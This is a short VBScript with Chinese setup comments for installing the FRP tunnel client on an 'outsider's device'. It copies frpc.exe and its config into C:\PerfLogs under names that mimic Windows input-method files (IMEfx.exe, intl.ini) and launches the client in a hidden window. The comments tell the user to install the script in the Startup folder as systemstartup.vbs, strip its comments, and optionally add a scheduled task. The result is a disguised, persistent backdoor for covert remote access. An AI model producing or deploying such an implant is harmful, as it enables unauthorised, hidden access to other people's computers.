' support windows ; for outsider's device 
' 1、准备3个文件( frp.exe、frp.ini、frp.vbs )复制到 dir_bak 目录，并修改相应变量名和路径
' 2、测试 frp.vbs 是否可正常运行
' 3、复制 frp.vbs 到系统开机启动目录并重命名为 systemstartup.vbs (并建议删除所有注释)
'    开机启动目录 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
' 4、(可选)将开机启动中的vbs添加进计划任务：我的电脑右键---管理---计划任务程序---创建基本任务
On Error Resume Next

Dim dir_bak,dir_run,frp,frpini,frp_run,frpini_run
dir_bak = "C:\Program Files\Windows NT\"
dir_run = "C:\PerfLogs\"
frp = "frpc.exe"
frpini = "frpc.ini"
frp_run = "IMEfx.exe"
frpini_run = "intl.ini"

Dim fsObj
Set fsObj = CreateObject("Scripting.FileSystemObject")
Function CopyFileFun(runfile,soufile,desfile)
  If Not fsObj.FileExists(runfile) Then fsObj.CopyFile (soufile), (desfile) End If
End Function
CopyFileFun (dir_run & frp_run),(dir_bak & frp),(dir_run & frp_run)
CopyFileFun (dir_run & frpini_run),(dir_bak & frpini),(dir_run & frpini_run)

' ------ 判断系统进程是否存在 -------------------------------
Dim proc,procfrp,frpProcess
Set proc = GetObject("winmgmts:\\.\root\cimv2")
' ------ 注意此处查询进程是否存在时需要手动输入进程名，使用变量运行失败-----待解决
Set procfrp = proc.ExecQuery("select * from win32_process where name = 'IMEfx.exe'")
For Each pf In procfrp
  frpProcess = True 
Next

set objShell = WScript.CreateObject("WScript.Shell")
If Not frpProcess Then objShell.Run (dir_run & frp_run & " -c " & dir_run & frpini_run), 0 End If

WScript.Quit
